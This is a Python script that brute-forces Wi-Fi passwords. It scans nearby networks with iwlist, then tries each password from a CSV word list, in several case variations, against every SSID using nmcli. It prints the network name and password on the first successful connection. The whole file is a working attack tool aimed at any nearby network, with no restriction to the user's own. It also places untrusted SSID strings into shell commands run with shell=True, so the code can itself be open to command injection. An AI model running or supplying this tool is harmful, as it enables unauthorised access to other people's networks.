#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import os
import sys
import csv
import subprocess
import re

PASSWORDS = os.path.join(os.path.abspath(os.path.dirname(__file__)), 'password.csv')

def get_network_list(interface='wlp3s0'):  # Replace 'wlp3s0' with your actual interface name
    """Retrieve the list of nearby networks and their SSIDs using iwlist."""
    try:
        net_list_comm = f'sudo iwlist {interface} scan'
        net_list_txt = subprocess.check_output(net_list_comm, shell=True, text=True)

        ssids = re.findall(r'ESSID:"([^"]*)"', net_list_txt)
        return len(ssids), ssids
    except subprocess.CalledProcessError as e:
        print(f"Error fetching network list: {e}")
        sys.exit(1)

def _sanitize_field(node):
    """Sanitize fields for safe use in commands."""
    return node.replace("'", "\\'") if node else node

def get_password_array(password):
    """Generate variations of the password."""
    password_data = []
    pass_array = [
        password.lower(),
        password.upper(),
        password[0].upper() + password[1:],
        ''.join(c.lower() if i % 2 == 0 else c for i, c in enumerate(password)),
        ''.join(c.upper() if i % 2 == 0 else c for i, c in enumerate(password))
    ]
    password_data.append(len(pass_array))
    password_data.append(pass_array)
    return password_data

def process_element(itera, elem, net_array):
    """Attempt to connect to each network using each password."""
    net_size, net_names_array = net_array
    _password = _sanitize_field(elem[0])

    passwords = get_password_array(_password)

    for i in range(net_size):
        for j in range(passwords[0]):
            net_con = f'sudo nmcli dev wifi connect "{net_names_array[i]}" password "{passwords[1][j]}"'
            try:
                output = subprocess.check_output(net_con, shell=True, timeout=7, text=True)
                if "successfully activated" in output:
                    print(f'Network Name: {net_names_array[i]}\nNetwork Password: {passwords[1][j]}\n')
                    sys.exit()
            except subprocess.CalledProcessError:
                continue
            except subprocess.TimeoutExpired:
                continue

# Get network data
network_data = get_network_list()

# Process the passwords from the CSV file
with open(PASSWORDS, 'r', newline='', encoding='utf-8') as f:
    reader = csv.reader(f)
    for i, line in enumerate(reader):
        process_element(i, line, network_data)
